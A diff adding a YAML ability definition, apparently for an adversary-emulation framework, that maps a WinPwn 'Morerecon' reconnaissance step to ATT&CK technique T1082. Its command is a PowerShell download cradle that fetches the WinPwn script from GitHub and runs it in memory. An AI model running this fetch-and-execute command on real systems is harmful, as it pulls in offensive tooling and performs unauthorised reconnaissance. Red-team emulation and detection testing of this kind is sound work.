@@ -1,0 +1,18 @@
+- description: Gathers local system information using the Morerecon function of WinPwn
+  id: a9faa0d792d6bc2660b05e7650d2736d
+  name: WinPwn - Morerecon
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          Morerecon -noninteractive -consoleoutput
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
